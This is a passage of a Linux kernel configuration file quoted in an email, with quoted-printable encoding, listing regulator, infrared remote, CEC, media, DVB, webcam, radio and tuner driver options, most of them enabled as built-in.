> # CONFIG_REGULATOR_LP3972 is not set
> # CONFIG_REGULATOR_LP872X is not set
> # CONFIG_REGULATOR_LP8755 is not set
> # CONFIG_REGULATOR_LTC3589 is not set
> # CONFIG_REGULATOR_LTC3676 is not set
> # CONFIG_REGULATOR_MAX1586 is not set
> # CONFIG_REGULATOR_MAX77503 is not set
> # CONFIG_REGULATOR_MAX77675 is not set
> # CONFIG_REGULATOR_MAX77857 is not set
> # CONFIG_REGULATOR_MAX8649 is not set
> # CONFIG_REGULATOR_MAX8660 is not set
> # CONFIG_REGULATOR_MAX8893 is not set
> # CONFIG_REGULATOR_MAX8952 is not set
> # CONFIG_REGULATOR_MAX20086 is not set
> # CONFIG_REGULATOR_MAX20411 is not set
> # CONFIG_REGULATOR_MAX77826 is not set
> # CONFIG_REGULATOR_MAX77838 is not set
> # CONFIG_REGULATOR_MCP16502 is not set
> # CONFIG_REGULATOR_MP5416 is not set
> # CONFIG_REGULATOR_MP8859 is not set
> # CONFIG_REGULATOR_MP886X is not set
> # CONFIG_REGULATOR_MPQ7920 is not set
> # CONFIG_REGULATOR_MT6311 is not set
> # CONFIG_REGULATOR_MT6360 is not set
> # CONFIG_REGULATOR_MT6370 is not set
> # CONFIG_REGULATOR_PCA9450 is not set
> # CONFIG_REGULATOR_PF9453 is not set
> # CONFIG_REGULATOR_PF0900 is not set
> # CONFIG_REGULATOR_PF530X is not set
> # CONFIG_REGULATOR_PF8X00 is not set
> # CONFIG_REGULATOR_PFUZE100 is not set
> # CONFIG_REGULATOR_PV88060 is not set
> # CONFIG_REGULATOR_PV88080 is not set
> # CONFIG_REGULATOR_PV88090 is not set
> # CONFIG_REGULATOR_RAA215300 is not set
> # CONFIG_REGULATOR_RT4801 is not set
> # CONFIG_REGULATOR_RT4803 is not set
> # CONFIG_REGULATOR_RT5133 is not set
> # CONFIG_REGULATOR_RT5190A is not set
> # CONFIG_REGULATOR_RT5739 is not set
> # CONFIG_REGULATOR_RT5759 is not set
> # CONFIG_REGULATOR_RT6160 is not set
> # CONFIG_REGULATOR_RT6190 is not set
> # CONFIG_REGULATOR_RT6245 is not set
> # CONFIG_REGULATOR_RT8092 is not set
> # CONFIG_REGULATOR_RTQ2134 is not set
> # CONFIG_REGULATOR_RTMV20 is not set
> # CONFIG_REGULATOR_RTQ6752 is not set
> # CONFIG_REGULATOR_RTQ2208 is not set
> # CONFIG_REGULATOR_SLG51000 is not set
> # CONFIG_REGULATOR_SY8106A is not set
> # CONFIG_REGULATOR_SY8824X is not set
> # CONFIG_REGULATOR_SY8827N is not set
> # CONFIG_REGULATOR_TPS51632 is not set
> # CONFIG_REGULATOR_TPS62360 is not set
> # CONFIG_REGULATOR_TPS6286X is not set
> # CONFIG_REGULATOR_TPS6287X is not set
> # CONFIG_REGULATOR_TPS65023 is not set
> # CONFIG_REGULATOR_TPS6507X is not set
> # CONFIG_REGULATOR_TPS65132 is not set
> # CONFIG_REGULATOR_TPS65185 is not set
> # CONFIG_REGULATOR_TPS6524X is not set
> CONFIG_REGULATOR_TWL4030=3Dy
> # CONFIG_REGULATOR_VCTRL is not set
> CONFIG_RC_CORE=3Dy
> CONFIG_BPF_LIRC_MODE2=3Dy
> CONFIG_LIRC=3Dy
> # CONFIG_RC_MAP is not set
> # CONFIG_RC_DECODERS is not set
> CONFIG_RC_DEVICES=3Dy
> # CONFIG_IR_ENE is not set
> # CONFIG_IR_FINTEK is not set
> # CONFIG_IR_GPIO_CIR is not set
> # CONFIG_IR_GPIO_TX is not set
> # CONFIG_IR_HIX5HD2 is not set
> CONFIG_IR_IGORPLUGUSB=3Dy
> CONFIG_IR_IGUANA=3Dy
> CONFIG_IR_IMON=3Dy
> CONFIG_IR_IMON_RAW=3Dy
> # CONFIG_IR_ITE_CIR is not set
> CONFIG_IR_MCEUSB=3Dy
> # CONFIG_IR_NUVOTON is not set
> CONFIG_IR_REDRAT3=3Dy
> # CONFIG_IR_SERIAL is not set
> # CONFIG_IR_SPI is not set
> CONFIG_IR_STREAMZAP=3Dy
> CONFIG_IR_TOY=3Dy
> CONFIG_IR_TTUSBIR=3Dy
> # CONFIG_IR_WINBOND_CIR is not set
> CONFIG_RC_ATI_REMOTE=3Dy
> # CONFIG_RC_LOOPBACK is not set
> CONFIG_RC_XBOX_DVD=3Dy
> CONFIG_CEC_CORE=3Dy
>=20
> #
> # CEC support
> #
> # CONFIG_MEDIA_CEC_RC is not set
> CONFIG_MEDIA_CEC_SUPPORT=3Dy
> # CONFIG_CEC_CH7322 is not set
> # CONFIG_CEC_NXP_TDA9950 is not set
> # CONFIG_CEC_GPIO is not set
> # CONFIG_CEC_SECO is not set
> # CONFIG_USB_EXTRON_DA_HD_4K_PLUS_CEC is not set
> CONFIG_USB_PULSE8_CEC=3Dy
> CONFIG_USB_RAINSHADOW_CEC=3Dy
> # end of CEC support
>=20
> CONFIG_MEDIA_SUPPORT=3Dy
> CONFIG_MEDIA_SUPPORT_FILTER=3Dy
> # CONFIG_MEDIA_SUBDRV_AUTOSELECT is not set
>=20
> #
> # Media device types
> #
> CONFIG_MEDIA_CAMERA_SUPPORT=3Dy
> CONFIG_MEDIA_ANALOG_TV_SUPPORT=3Dy
> CONFIG_MEDIA_DIGITAL_TV_SUPPORT=3Dy
> CONFIG_MEDIA_RADIO_SUPPORT=3Dy
> CONFIG_MEDIA_SDR_SUPPORT=3Dy
> CONFIG_MEDIA_PLATFORM_SUPPORT=3Dy
> CONFIG_MEDIA_TEST_SUPPORT=3Dy
> # end of Media device types
>=20
> CONFIG_VIDEO_DEV=3Dy
> CONFIG_MEDIA_CONTROLLER=3Dy
> CONFIG_DVB_CORE=3Dy
>=20
> #
> # Video4Linux options
> #
> CONFIG_VIDEO_V4L2_I2C=3Dy
> CONFIG_VIDEO_V4L2_SUBDEV_API=3Dy
> # CONFIG_VIDEO_ADV_DEBUG is not set
> # CONFIG_VIDEO_FIXED_MINOR_RANGES is not set
> CONFIG_VIDEO_TUNER=3Dy
> CONFIG_V4L2_MEM2MEM_DEV=3Dy
> CONFIG_V4L2_FWNODE=3Dy
> CONFIG_V4L2_ASYNC=3Dy
> # end of Video4Linux options
>=20
> #
> # Media controller options
> #
> CONFIG_MEDIA_CONTROLLER_DVB=3Dy
> # end of Media controller options
>=20
> #
> # Digital TV options
> #
> # CONFIG_DVB_MMAP is not set
> # CONFIG_DVB_NET is not set
> CONFIG_DVB_MAX_ADAPTERS=3D16
> # CONFIG_DVB_DYNAMIC_MINORS is not set
> # CONFIG_DVB_DEMUX_SECTION_LOSS_LOG is not set
> # CONFIG_DVB_ULE_DEBUG is not set
> # end of Digital TV options
>=20
> #
> # Media drivers
> #
>=20
> #
> # Drivers filtered as selected at 'Filter media drivers'
> #
>=20
> #
> # Media drivers
> #
> CONFIG_MEDIA_USB_SUPPORT=3Dy
>=20
> #
> # Webcam devices
> #
> CONFIG_USB_GSPCA=3Dy
> CONFIG_USB_GSPCA_BENQ=3Dy
> CONFIG_USB_GSPCA_CONEX=3Dy
> CONFIG_USB_GSPCA_CPIA1=3Dy
> CONFIG_USB_GSPCA_DTCS033=3Dy
> CONFIG_USB_GSPCA_ETOMS=3Dy
> CONFIG_USB_GSPCA_FINEPIX=3Dy
> CONFIG_USB_GSPCA_JEILINJ=3Dy
> CONFIG_USB_GSPCA_JL2005BCD=3Dy
> CONFIG_USB_GSPCA_KINECT=3Dy
> CONFIG_USB_GSPCA_KONICA=3Dy
> CONFIG_USB_GSPCA_MARS=3Dy
> CONFIG_USB_GSPCA_MR97310A=3Dy
> CONFIG_USB_GSPCA_NW80X=3Dy
> CONFIG_USB_GSPCA_OV519=3Dy
> CONFIG_USB_GSPCA_OV534=3Dy
> CONFIG_USB_GSPCA_OV534_9=3Dy
> CONFIG_USB_GSPCA_PAC207=3Dy
> CONFIG_USB_GSPCA_PAC7302=3Dy
> CONFIG_USB_GSPCA_PAC7311=3Dy
> CONFIG_USB_GSPCA_SE401=3Dy
> CONFIG_USB_GSPCA_SN9C2028=3Dy
> CONFIG_USB_GSPCA_SN9C20X=3Dy
> CONFIG_USB_GSPCA_SONIXB=3Dy
> CONFIG_USB_GSPCA_SONIXJ=3Dy
> CONFIG_USB_GSPCA_SPCA1528=3Dy
> CONFIG_USB_GSPCA_SPCA500=3Dy
> CONFIG_USB_GSPCA_SPCA501=3Dy
> CONFIG_USB_GSPCA_SPCA505=3Dy
> CONFIG_USB_GSPCA_SPCA506=3Dy
> CONFIG_USB_GSPCA_SPCA508=3Dy
> CONFIG_USB_GSPCA_SPCA561=3Dy
> CONFIG_USB_GSPCA_SQ905=3Dy
> CONFIG_USB_GSPCA_SQ905C=3Dy
> CONFIG_USB_GSPCA_SQ930X=3Dy
> CONFIG_USB_GSPCA_STK014=3Dy
> CONFIG_USB_GSPCA_STK1135=3Dy
> CONFIG_USB_GSPCA_STV0680=3Dy
> CONFIG_USB_GSPCA_SUNPLUS=3Dy
> CONFIG_USB_GSPCA_T613=3Dy
> CONFIG_USB_GSPCA_TOPRO=3Dy
> CONFIG_USB_GSPCA_TOUPTEK=3Dy
> CONFIG_USB_GSPCA_TV8532=3Dy
> CONFIG_USB_GSPCA_VC032X=3Dy
> CONFIG_USB_GSPCA_VICAM=3Dy
> CONFIG_USB_GSPCA_XIRLINK_CIT=3Dy
> CONFIG_USB_GSPCA_ZC3XX=3Dy
> CONFIG_USB_GL860=3Dy
> CONFIG_USB_M5602=3Dy
> CONFIG_USB_STV06XX=3Dy
> CONFIG_USB_PWC=3Dy
> # CONFIG_USB_PWC_DEBUG is not set
> CONFIG_USB_PWC_INPUT_EVDEV=3Dy
> CONFIG_USB_S2255=3Dy
> CONFIG_VIDEO_USBTV=3Dy
> CONFIG_USB_VIDEO_CLASS=3Dy
> CONFIG_USB_VIDEO_CLASS_INPUT_EVDEV=3Dy
>=20
> #
> # Analog TV USB devices
> #
> CONFIG_VIDEO_GO7007=3Dy
> CONFIG_VIDEO_GO7007_USB=3Dy
> CONFIG_VIDEO_GO7007_LOADER=3Dy
> CONFIG_VIDEO_GO7007_USB_S2250_BOARD=3Dy
> CONFIG_VIDEO_HDPVR=3Dy
> CONFIG_VIDEO_PVRUSB2=3Dy
> CONFIG_VIDEO_PVRUSB2_SYSFS=3Dy
> CONFIG_VIDEO_PVRUSB2_DVB=3Dy
> # CONFIG_VIDEO_PVRUSB2_DEBUGIFC is not set
> CONFIG_VIDEO_STK1160=3Dy
>=20
> #
> # Analog/digital TV USB devices
> #
> CONFIG_VIDEO_AU0828=3Dy
> CONFIG_VIDEO_AU0828_V4L2=3Dy
> CONFIG_VIDEO_AU0828_RC=3Dy
> CONFIG_VIDEO_CX231XX=3Dy
> CONFIG_VIDEO_CX231XX_RC=3Dy
> CONFIG_VIDEO_CX231XX_ALSA=3Dy
> CONFIG_VIDEO_CX231XX_DVB=3Dy
>=20
> #
> # Digital TV USB devices
> #
> CONFIG_DVB_AS102=3Dy
> CONFIG_DVB_B2C2_FLEXCOP_USB=3Dy
> # CONFIG_DVB_B2C2_FLEXCOP_USB_DEBUG is not set
> CONFIG_DVB_USB_V2=3Dy
> CONFIG_DVB_USB_AF9015=3Dy
> CONFIG_DVB_USB_AF9035=3Dy
> CONFIG_DVB_USB_ANYSEE=3Dy
> CONFIG_DVB_USB_AU6610=3Dy
> CONFIG_DVB_USB_AZ6007=3Dy
> CONFIG_DVB_USB_CE6230=3Dy
> CONFIG_DVB_USB_DVBSKY=3Dy
> CONFIG_DVB_USB_EC168=3Dy
> CONFIG_DVB_USB_GL861=3Dy
> CONFIG_DVB_USB_LME2510=3Dy
> CONFIG_DVB_USB_MXL111SF=3Dy
> CONFIG_DVB_USB_RTL28XXU=3Dy
> CONFIG_DVB_USB_ZD1301=3Dy
> CONFIG_DVB_USB=3Dy
> # CONFIG_DVB_USB_DEBUG is not set
> CONFIG_DVB_USB_A800=3Dy
> CONFIG_DVB_USB_AF9005=3Dy
> CONFIG_DVB_USB_AF9005_REMOTE=3Dy
> CONFIG_DVB_USB_AZ6027=3Dy
> CONFIG_DVB_USB_CINERGY_T2=3Dy
> CONFIG_DVB_USB_CXUSB=3Dy
> CONFIG_DVB_USB_CXUSB_ANALOG=3Dy
> CONFIG_DVB_USB_DIB0700=3Dy
> CONFIG_DVB_USB_DIB3000MC=3Dy
> CONFIG_DVB_USB_DIBUSB_MB=3Dy
> # CONFIG_DVB_USB_DIBUSB_MB_FAULTY is not set
> CONFIG_DVB_USB_DIBUSB_MC=3Dy
> CONFIG_DVB_USB_DIGITV=3Dy
> CONFIG_DVB_USB_DTT200U=3Dy
> CONFIG_DVB_USB_DTV5100=3Dy
> CONFIG_DVB_USB_DW2102=3Dy
> CONFIG_DVB_USB_GP8PSK=3Dy
> CONFIG_DVB_USB_M920X=3Dy
> CONFIG_DVB_USB_NOVA_T_USB2=3Dy
> CONFIG_DVB_USB_OPERA1=3Dy
> CONFIG_DVB_USB_PCTV452E=3Dy
> CONFIG_DVB_USB_TECHNISAT_USB2=3Dy
> CONFIG_DVB_USB_TTUSB2=3Dy
> CONFIG_DVB_USB_UMT_010=3Dy
> CONFIG_DVB_USB_VP702X=3Dy
> CONFIG_DVB_USB_VP7045=3Dy
> CONFIG_SMS_USB_DRV=3Dy
> CONFIG_DVB_TTUSB_BUDGET=3Dy
> CONFIG_DVB_TTUSB_DEC=3Dy
>=20
> #
> # Webcam, TV (analog/digital) USB devices
> #
> CONFIG_VIDEO_EM28XX=3Dy
> CONFIG_VIDEO_EM28XX_V4L2=3Dy
> CONFIG_VIDEO_EM28XX_ALSA=3Dy
> CONFIG_VIDEO_EM28XX_DVB=3Dy
> CONFIG_VIDEO_EM28XX_RC=3Dy
>=20
> #
> # Software defined radio USB devices
> #
> CONFIG_USB_AIRSPY=3Dy
> CONFIG_USB_HACKRF=3Dy
> CONFIG_USB_MSI2500=3Dy
> # CONFIG_MEDIA_PCI_SUPPORT is not set
> CONFIG_RADIO_ADAPTERS=3Dy
> # CONFIG_RADIO_MAXIRADIO is not set
> # CONFIG_RADIO_SAA7706H is not set
> CONFIG_RADIO_SHARK=3Dy
> CONFIG_RADIO_SHARK2=3Dy
> CONFIG_RADIO_SI4713=3Dy
> CONFIG_RADIO_TEA575X=3Dy
> # CONFIG_RADIO_TEA5764 is not set
> # CONFIG_RADIO_TEF6862 is not set
> CONFIG_USB_DSBR=3Dy
> CONFIG_USB_KEENE=3Dy
> CONFIG_USB_MA901=3Dy
> CONFIG_USB_MR800=3Dy
> CONFIG_USB_RAREMONO=3Dy
> CONFIG_RADIO_SI470X=3Dy
> CONFIG_USB_SI470X=3Dy
> # CONFIG_I2C_SI470X is not set
> CONFIG_USB_SI4713=3Dy
> # CONFIG_PLATFORM_SI4713 is not set
> CONFIG_I2C_SI4713=3Dy
> # CONFIG_MEDIA_PLATFORM_DRIVERS is not set
>=20
> #
> # MMC/SDIO DVB adapters
> #
> CONFIG_SMS_SDIO_DRV=3Dy
> CONFIG_V4L_TEST_DRIVERS=3Dy
> CONFIG_VIDEO_VIM2M=3Dy
> CONFIG_VIDEO_VICODEC=3Dy
> CONFIG_VIDEO_VIMC=3Dy
> CONFIG_VIDEO_VIVID=3Dy
> CONFIG_VIDEO_VIVID_CEC=3Dy
> # CONFIG_VIDEO_VIVID_OSD is not set
> CONFIG_VIDEO_VIVID_MAX_DEVS=3D64
> # CONFIG_VIDEO_VISL is not set
> CONFIG_DVB_TEST_DRIVERS=3Dy
> CONFIG_DVB_VIDTV=3Dy
>=20
> #
> # FireWire (IEEE 1394) Adapters
> #
> # CONFIG_DVB_FIREDTV is not set
> CONFIG_MEDIA_COMMON_OPTIONS=3Dy
>=20
> #
> # common driver options
> #
> CONFIG_CYPRESS_FIRMWARE=3Dy
> CONFIG_TTPCI_EEPROM=3Dy
> CONFIG_UVC_COMMON=3Dy
> CONFIG_VIDEO_CX2341X=3Dy
> CONFIG_VIDEO_TVEEPROM=3Dy
> CONFIG_DVB_B2C2_FLEXCOP=3Dy
> CONFIG_SMS_SIANO_MDTV=3Dy
> CONFIG_SMS_SIANO_RC=3Dy
> CONFIG_SMS_SIANO_DEBUGFS=3Dy
> CONFIG_VIDEO_V4L2_TPG=3Dy
> CONFIG_VIDEOBUF2_CORE=3Dy
> CONFIG_VIDEOBUF2_V4L2=3Dy
> CONFIG_VIDEOBUF2_MEMOPS=3Dy
> CONFIG_VIDEOBUF2_DMA_CONTIG=3Dy
> CONFIG_VIDEOBUF2_VMALLOC=3Dy
> CONFIG_VIDEOBUF2_DMA_SG=3Dy
> # end of Media drivers
>=20
> #
> # Media ancillary drivers
> #
> CONFIG_MEDIA_ATTACH=3Dy
> # CONFIG_VIDEO_IR_I2C is not set
> # CONFIG_VIDEO_CAMERA_SENSOR is not set
>=20
> #
> # Camera ISPs
> #
> # CONFIG_VIDEO_THP7312 is not set
> # end of Camera ISPs
>=20
> CONFIG_VIDEO_CAMERA_LENS=3Dy
> # CONFIG_VIDEO_AD5820 is not set
> # CONFIG_VIDEO_AK7375 is not set
> # CONFIG_VIDEO_DW9714 is not set
> # CONFIG_VIDEO_DW9719 is not set
> # CONFIG_VIDEO_DW9768 is not set
> # CONFIG_VIDEO_DW9807_VCM is not set
>=20
> #
> # Flash devices
> #
> # CONFIG_VIDEO_ADP1653 is not set
> # CONFIG_VIDEO_LM3560 is not set
> # CONFIG_VIDEO_LM3646 is not set
> # end of Flash devices
>=20
> #
> # Audio decoders, processors and mixers
> #
> # CONFIG_VIDEO_CS3308 is not set
> # CONFIG_VIDEO_CS5345 is not set
> CONFIG_VIDEO_CS53L32A=3Dy
> CONFIG_VIDEO_MSP3400=3Dy
> # CONFIG_VIDEO_SONY_BTF_MPX is not set
> # CONFIG_VIDEO_TDA1997X is not set
> # CONFIG_VIDEO_TDA7432 is not set
> # CONFIG_VIDEO_TDA9840 is not set
> # CONFIG_VIDEO_TEA6415C is not set
> # CONFIG_VIDEO_TEA6420 is not set
> # CONFIG_VIDEO_TLV320AIC23B is not set
> # CONFIG_VIDEO_TVAUDIO is not set
> # CONFIG_VIDEO_UDA1342 is not set
> # CONFIG_VIDEO_VP27SMPX is not set
> # CONFIG_VIDEO_WM8739 is not set
> CONFIG_VIDEO_WM8775=3Dy
> # end of Audio decoders, processors and mixers
>=20
> #
> # RDS decoders
> #
> # CONFIG_VIDEO_SAA6588 is not set
> # end of RDS decoders
>=20
> #
> # Video decoders
> #
> # CONFIG_VIDEO_ADV7180 is not set
> # CONFIG_VIDEO_ADV7183 is not set
> # CONFIG_VIDEO_ADV748X is not set
> # CONFIG_VIDEO_ADV7604 is not set
> # CONFIG_VIDEO_ADV7842 is not set
> # CONFIG_VIDEO_BT819 is not set
> # CONFIG_VIDEO_BT856 is not set
> # CONFIG_VIDEO_BT866 is not set
> # CONFIG_VIDEO_ISL7998X is not set
> # CONFIG_VIDEO_LT6911UXE is not set
> # CONFIG_VIDEO_KS0127 is not set
> # CONFIG_VIDEO_MAX9286 is not set
> # CONFIG_VIDEO_ML86V7667 is not set
> # CONFIG_VIDEO_SAA7110 is not set
> CONFIG_VIDEO_SAA711X=3Dy
> # CONFIG_VIDEO_TC358743 is not set
> # CONFIG_VIDEO_TC358746 is not set
> # CONFIG_VIDEO_TVP514X is not set
> # CONFIG_VIDEO_TVP5150 is not set
> # CONFIG_VIDEO_TVP7002 is not set
> # CONFIG_VIDEO_TW2804 is not set
> # CONFIG_VIDEO_TW9900 is not set
> # CONFIG_VIDEO_TW9903 is not set
> # CONFIG_VIDEO_TW9906 is not set
> # CONFIG_VIDEO_TW9910 is not set
> # CONFIG_VIDEO_VPX3220 is not set
>=20
> #
> # Video and audio decoders
> #
> # CONFIG_VIDEO_SAA717X is not set
> CONFIG_VIDEO_CX25840=3Dy
> # end of Video decoders
>=20
> #
> # Video encoders
> #
> # CONFIG_VIDEO_ADV7170 is not set
> # CONFIG_VIDEO_ADV7175 is not set
> # CONFIG_VIDEO_ADV7343 is not set
> # CONFIG_VIDEO_ADV7393 is not set
> # CONFIG_VIDEO_ADV7511 is not set
> # CONFIG_VIDEO_AK881X is not set
> # CONFIG_VIDEO_SAA7127 is not set
> # CONFIG_VIDEO_SAA7185 is not set
> # CONFIG_VIDEO_THS8200 is not set
> # end of Video encoders
>=20
> #
> # Video improvement chips
> #
> # CONFIG_VIDEO_UPD64031A is not set
> # CONFIG_VIDEO_UPD64083 is not set
> # end of Video improvement chips
>=20
> #
> # Audio/Video compression chips
> #
> # CONFIG_VIDEO_SAA6752HS is not set
> # end of Audio/Video compression chips
>=20
> #
> # SDR tuner chips
> #
> # CONFIG_SDR_MAX2175 is not set
> # end of SDR tuner chips
>=20
> #
> # Miscellaneous helper chips
> #
> # CONFIG_VIDEO_I2C is not set
> # CONFIG_VIDEO_M52790 is not set
> # CONFIG_VIDEO_ST_MIPID02 is not set
> # CONFIG_VIDEO_THS7303 is not set
> # end of Miscellaneous helper chips
>=20
> #
> # Video serializers and deserializers
> #
> # CONFIG_VIDEO_DS90UB913 is not set
> # CONFIG_VIDEO_DS90UB953 is not set
> # CONFIG_VIDEO_DS90UB960 is not set
> # CONFIG_VIDEO_MAX96714 is not set
> # CONFIG_VIDEO_MAX96717 is not set
> # end of Video serializers and deserializers
>=20
> #
> # Media SPI Adapters
> #
> # CONFIG_CXD2880_SPI_DRV is not set
> # CONFIG_VIDEO_GS1662 is not set
> # end of Media SPI Adapters
>=20
> CONFIG_MEDIA_TUNER=3Dy
>=20
> #
> # Customize TV tuners
> #
> # CONFIG_MEDIA_TUNER_E4000 is not set
> # CONFIG_MEDIA_TUNER_FC0011 is not set
> # CONFIG_MEDIA_TUNER_FC0012 is not set
> # CONFIG_MEDIA_TUNER_FC0013 is not set
> # CONFIG_MEDIA_TUNER_FC2580 is not set
> # CONFIG_MEDIA_TUNER_IT913X is not set
> # CONFIG_MEDIA_TUNER_M88RS6000T is not set
> # CONFIG_MEDIA_TUNER_MAX2165 is not set
> # CONFIG_MEDIA_TUNER_MC44S803 is not set
> CONFIG_MEDIA_TUNER_MSI001=3Dy
> # CONFIG_MEDIA_TUNER_MT2060 is not set
> # CONFIG_MEDIA_TUNER_MT2063 is not set
> # CONFIG_MEDIA_TUNER_MT20XX is not set
> # CONFIG_MEDIA_TUNER_MT2131 is not set
> # CONFIG_MEDIA_TUNER_MT2266 is not set
> # CONFIG_MEDIA_TUNER_MXL301RF is not set
> # CONFIG_MEDIA_TUNER_MXL5005S is not set
> # CONFIG_MEDIA_TUNER_MXL5007T is not set
> # CONFIG_MEDIA_TUNER_QM1D1B0004 is not set
> # CONFIG_MEDIA_TUNER_QM1D1C0042 is not set
> # CONFIG_MEDIA_TUNER_QT1010 is not set
> # CONFIG_MEDIA_TUNER_R820T is not set
> # CONFIG_MEDIA_TUNER_SI2157 is not set
> # CONFIG_MEDIA_TUNER_SIMPLE is not set
> # CONFIG_MEDIA_TUNER_TDA18212 is not set
> # CONFIG_MEDIA_TUNER_TDA18218 is not set
> # CONFIG_MEDIA_TUNER_TDA18250 is not set
> # CONFIG_MEDIA_TUNER_TDA18271 is not set
> # CONFIG_MEDIA_TUNER_TDA827X is not set
> # CONFIG_MEDIA_TUNER_TDA8290 is not set
> # CONFIG_MEDIA_TUNER_TDA9887 is not set
> # CONFIG_MEDIA_TUNER_TEA5761 is not set
> # CONFIG_MEDIA_TUNER_TEA5767 is not set
> # CONFIG_MEDIA_TUNER_TUA9001 is not set
> # CONFIG_MEDIA_TUNER_XC2028 is not set
> # CONFIG_MEDIA_TUNER_XC4000 is not set
> # CONFIG_MEDIA_TUNER_XC5000 is not set
> # end of Customize TV tuners
>=20
> #
> # Customise DVB Frontends
> #
>=20
> #
> # Multistandard (satellite) frontends
> #
> # CONFIG_DVB_M88DS3103 is not set
> # CONFIG_DVB_MXL5XX is not set
> # CONFIG_DVB_STB0899 is not set
> # CONFIG_DVB_STB6100 is not set
> # CONFIG_DVB_STV090x is not set
> # CONFIG_DVB_STV0910 is not set
> # CONFIG_DVB_STV6110x is not set
> # CONFIG_DVB_STV6111 is not set
>=20
> #
> # Multistandard (cable + terrestrial) frontends
> #
> # CONFIG_DVB_DRXK is not set
> # CONFIG_DVB_MN88472 is not set
> # CONFIG_DVB_MN88473 is not set
> # CONFIG_DVB_SI2165 is not set
> # CONFIG_DVB_TDA18271C2DD is not set
>=20
> #
> # DVB-S (satellite) frontends
> #
> # CONFIG_DVB_CX24110 is not set
> # CONFIG_DVB_CX24116 is not set
> # CONFIG_DVB_CX24117 is not set
> # CONFIG_DVB_CX24120 is not set
> # CONFIG_DVB_CX24123 is not set
> # CONFIG_DVB_DS3000 is not set
> # CONFIG_DVB_MB86A16 is not set
> # CONFIG_DVB_MT312 is not set
> # CONFIG_DVB_S5H1420 is not set
> # CONFIG_DVB_SI21XX is not set
> # CONFIG_DVB_STB6000 is not set
> # CONFIG_DVB_STV0288 is not set
> # CONFIG_DVB_STV0299 is not set
> # CONFIG_DVB_STV0900 is not set
> # CONFIG_DVB_STV6110 is not set
> # CONFIG_DVB_TDA10071 is not set
> # CONFIG_DVB_TDA10086 is not set
> # CONFIG_DVB_TDA8083 is not set
> # CONFIG_DVB_TDA8261 is not set
> # CONFIG_DVB_TDA826X is not set
> # CONFIG_DVB_TS2020 is not set
> # CONFIG_DVB_TUA6100 is not set
> # CONFIG_DVB_TUNER_CX24113 is not set
> # CONFIG_DVB_TUNER_ITD1000 is not set
> # CONFIG_DVB_VES1X93 is not set
> # CONFIG_DVB_ZL10036 is not set
> # CONFIG_DVB_ZL10039 is not set
>=20
> #
> # DVB-T (terrestrial) frontends
> #
> CONFIG_DVB_AF9013=3Dy
> CONFIG_DVB_AS102_FE=3Dy
> # CONFIG_DVB_CX22700 is not set
> # CONFIG_DVB_CX22702 is not set
> # CONFIG_DVB_CXD2820R is not set
> # CONFIG_DVB_CXD2841ER is not set
> CONFIG_DVB_DIB3000MB=3Dy
> CONFIG_DVB_DIB3000MC=3Dy
> # CONFIG_DVB_DIB7000M is not set
> # CONFIG_DVB_DIB7000P is not set
> # CONFIG_DVB_DIB9000 is not set
> # CONFIG_DVB_DRXD is not set
> CONFIG_DVB_EC100=3Dy
> CONFIG_DVB_GP8PSK_FE=3Dy
> # CONFIG_DVB_L64781 is not set
> # CONFIG_DVB_MT352 is not set
> # CONFIG_DVB_NXT6000 is not set
> CONFIG_DVB_RTL2830=3Dy
> CONFIG_DVB_RTL2832=3Dy
> CONFIG_DVB_RTL2832_SDR=3Dy
> # CONFIG_DVB_S5H1432 is not set
> # CONFIG_DVB_SI2168 is not set
> # CONFIG_DVB_SP887X is not set
> # CONFIG_DVB_STV0367 is not set
> # CONFIG_DVB_TDA10048 is not set
> # CONFIG_DVB_TDA1004X is not set
> # CONFIG_DVB_ZD1301_DEMOD is not set
> CONFIG_DVB_ZL10353=3Dy
> # CONFIG_DVB_CXD2880 is not set
>=20
> #
> # DVB-C (cable) frontends
> #
> # CONFIG_DVB_STV0297 is not set
> # CONFIG_DVB_TDA10021 is not set
> # CONFIG_DVB_TDA10023 is not set
> # CONFIG_DVB_VES1820 is not set
>=20
> #
> # ATSC (North American/Korean Terrestrial/Cable DTV) frontends
> #
> # CONFIG_DVB_AU8522_DTV is not set
> # CONFIG_DVB_AU8522_V4L is not set
> # CONFIG_DVB_BCM3510 is not set
> # CONFIG_DVB_LG2160 is not set
> # CONFIG_DVB_LGDT3305 is not set
> # CONFIG_DVB_LGDT3306A is not set
> # CONFIG_DVB_LGDT330X is not set
> # CONFIG_DVB_MXL692 is not set
> # CONFIG_DVB_NXT200X is not set
> # CONFIG_DVB_OR51132 is not set
> # CONFIG_DVB_OR51211 is not set
> # CONFIG_DVB_S5H1409 is not set
> # CONFIG_DVB_S5H1411 is not set
>=20
> #
> # ISDB-T (terrestrial) frontends
> #
> # CONFIG_DVB_DIB8000 is not set
> # CONFIG_DVB_MB86A20S is not set
> # CONFIG_DVB_S921 is not set
>=20
> #
> # ISDB-S (satellite) & ISDB-T (terrestrial) frontends
> #
> # CONFIG_DVB_MN88443X is not set
> # CONFIG_DVB_TC90522 is not set
>=20
> #
> # Digital terrestrial only tuners/PLL
> #
> # CONFIG_DVB_PLL is not set
> # CONFIG_DVB_TUNER_DIB0070 is not set
> # CONFIG_DVB_TUNER_DIB0090 is not set
>=20
> #
> # SEC control devices for DVB-S
> #
> # CONFIG_DVB_A8293 is not set
> CONFIG_DVB_AF9033=3Dy
> # CONFIG_DVB_ASCOT2E is not set
> # CONFIG_DVB_ATBM8830 is not set
> # CONFIG_DVB_HELENE is not set
> # CONFIG_DVB_HORUS3A is not set
> # CONFIG_DVB_ISL6405 is not set
> # CONFIG_DVB_ISL6421 is not set
> # CONFIG_DVB_ISL6423 is not set
> # CONFIG_DVB_IX2505V is not set
> # CONFIG_DVB_LGS8GL5 is not set
> # CONFIG_DVB_LGS8GXX is not set
> # CONFIG_DVB_LNBH25 is not set
> # CONFIG_DVB_LNBH29 is not set
> # CONFIG_DVB_LNBP21 is not set
> # CONFIG_DVB_LNBP22 is not set
> # CONFIG_DVB_M88RS2000 is not set
> # CONFIG_DVB_TDA665x is not set
> # CONFIG_DVB_DRX39XYJ is not set
>=20
> #
> # Common Interface (EN50221) controller drivers
> #
> # CONFIG_DVB_CXD2099 is not set
> # CONFIG_DVB_SP2 is not set
> # end of Customise DVB Frontends
>=20
> #
> # Tools to develop new frontends
> #
> # CONFIG_DVB_DUMMY_FE is not set
> # end of Media ancillary drivers
>=20
> #
> # Graphics support
> #
> CONFIG_APERTURE_HELPERS=3Dy
> CONFIG_SCREEN_INFO=3Dy
> CONFIG_VIDEO=3Dy
> # CONFIG_AUXDISPLAY is not set
> # CONFIG_PANEL is not set
> CONFIG_AGP=3Dy
